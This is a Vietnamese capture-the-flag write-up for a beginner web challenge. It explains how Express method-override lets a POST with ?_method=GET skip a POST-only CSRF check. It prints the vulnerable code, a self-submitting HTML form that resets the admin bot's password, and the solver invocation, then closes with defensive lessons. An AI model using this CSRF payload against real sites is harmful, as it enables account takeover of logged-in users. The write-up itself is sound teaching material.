# Get The Flag — Writeup (L3akCTF 2026, Beginner/web)

- **Flag:** `L3AK{m37h0D_0V3rRide_c5Rf_Bypass_g0_bRRRR}`
- **Trạng thái:** ✅ Verified (exploit chạy end-to-end trên instance chính thức, đọc `/flag`)
- **Điểm/Solves:** 68 / 168
- **File:** `files/get-the-flag.zip` (source Node/Express + bot Puppeteer)

---

## 1. Đề bài yêu cầu gì

Một web app Express nhỏ: có đăng ký/đăng nhập, trang `/flag` **chỉ admin** xem được, và một **bot admin** (Puppeteer) sẽ đăng nhập bằng tài khoản `admin` rồi mở trang `/pages/<uuid>.html` mà người chơi upload và "report". Mục tiêu: lừa bot admin để lấy flag.

## 2. Kiến thức nền

- **CSRF (Cross-Site Request Forgery):** ép trình duyệt nạn nhân (đang đăng nhập) gửi request thay đổi trạng thái. Phòng chống bằng **CSRF token** bí mật.
- **HTTP method override:** middleware cho phép giả lập PUT/DELETE... từ form HTML (chỉ gửi được GET/POST) bằng tham số như `?_method=`. Nó **ghi đè `req.method`**.
- **CSP `sandbox`:** header `Content-Security-Policy: sandbox ...` biến trang thành sandboxed; `allow-scripts allow-forms allow-same-origin` cho phép chạy JS và submit form cùng origin, còn `connect-src 'none'; frame-src 'none'` chặn `fetch`/`iframe`.

## 3. Phân tích — vì sao chọn account takeover

Trang upload được phục vụ với CSP:
```
sandbox allow-scripts allow-forms allow-same-origin; connect-src 'none'; frame-src 'none'; object-src 'none'
```
Cookie session là `httpOnly` (JS không đọc được), `connect-src 'none'` chặn `fetch`/`XHR`, `frame-src 'none'` chặn iframe. ⇒ **không thể** dùng XSS để đọc `/flag` rồi exfil qua mạng. Nhưng `allow-forms` + `allow-scripts` + same-origin cho phép **submit form đổi trạng thái**. Hướng đi: **CSRF chiếm mật khẩu admin**, rồi tự đăng nhập admin đọc flag.

Nhưng endpoint đổi mật khẩu có bảo vệ CSRF... ta cần bypass nó.

### Lỗ hổng cốt lõi: method-override phá CSRF

```js
app.use(methodOverride((req) => {
  if (typeof req.query._method === "string") return req.query._method.toUpperCase();
}));
// ...
function csrfOnPostOnly(req, res, next) {
  if (req.method !== "POST") return next();          // <-- chỉ check khi POST
  if (!req.body.csrf || req.body.csrf !== req.session.csrf) return res.status(403)...
  next();
}
app.all("/account/change-password", requireLogin, csrfOnPostOnly, (req, res) => {
  if (req.method === "GET" && !req.body?.password) return res.render("change-password", ...);
  const { password, confirm } = req.body ?? {};
  if (!password || password !== confirm || password.length < 8) return res.status(400)...;
  changePassword(req.session.userId, password);       // <-- đổi mật khẩu người đang đăng nhập
  res.send("Password changed successfully");
});
```

`methodOverride` chạy **trước** `csrfOnPostOnly`. Nếu ta gửi một request **POST** tới `/account/change-password?_method=GET`:
1. `methodOverride` đổi `req.method` → `"GET"`.
2. `csrfOnPostOnly` thấy method ≠ POST ⇒ **bỏ qua kiểm tra CSRF**.
3. Handler: method là GET nhưng `req.body.password` tồn tại (POST vẫn có body) ⇒ **không** render form, mà chạy thẳng `changePassword`.

⇒ Đổi được mật khẩu mà **không cần CSRF token**. Chạy trong trình duyệt bot admin ⇒ đổi mật khẩu `admin`.

## 4. Các bước khai thác

1. Đăng ký + đăng nhập một tài khoản thường (để được phép upload & report).
2. Upload trang HTML tự submit form CSRF:
   ```html
   <form id="f" action="/account/change-password?_method=GET" method="POST">
   <input name="password" value="Pwned_admin_123">
   <input name="confirm" value="Pwned_admin_123">
   </form><script>document.forms[0].submit()</script>
   ```
3. `POST /report` với `url=/pages/<uuid>.html` ⇒ bot admin mở trang ⇒ mật khẩu admin bị đổi thành `Pwned_admin_123`.
4. Đăng nhập `admin` / `Pwned_admin_123` ⇒ `GET /flag` ⇒ flag.

Solver: [solve/exploit.py](../solve/exploit.py). Chạy:
```bash
python solve/exploit.py https://get-the-flag-<id>.instances.ctf.l3ak.team
```

## 5. Cách xác minh flag

Exploit chạy end-to-end trên instance chính thức, đăng nhập admin bằng mật khẩu mới rồi đọc endpoint `/flag` (chỉ admin) trả về:
`L3AK{m37h0D_0V3rRide_c5Rf_Bypass_g0_bRRRR}` — xem `solve/evidence/run_transcript.txt`. Tên flag ("method override csrf bypass go brrr") xác nhận đúng kỹ thuật.

## 6. Bài học & lỗi thường gặp

- **Method override + bảo vệ theo verb là combo nguy hiểm:** đừng bao giờ gate bảo mật (CSRF, phân quyền) theo `req.method` sau khi đã bật `methodOverride`. Kẻ tấn công điều khiển được `req.method`.
- **CSRF check phải phủ mọi verb làm đổi trạng thái**, không chỉ POST.
- **CSP sandbox không cứu được logic sai:** dù chặn fetch/iframe/cookie-theft, vẫn còn hướng CSRF/form-submit đổi trạng thái.
- **Lỗi thường gặp:** loay hoay tìm cách đọc `/flag` bằng XSS (bị CSP chặn) thay vì nhận ra hướng account-takeover.

## 7. Đường đi nhanh lần sau

Thấy `method-override` + middleware bảo mật kiểm theo `req.method` ⇒ thử `?_method=` để lật verb và né kiểm tra. Kết hợp bot admin ⇒ CSRF chiếm tài khoản.
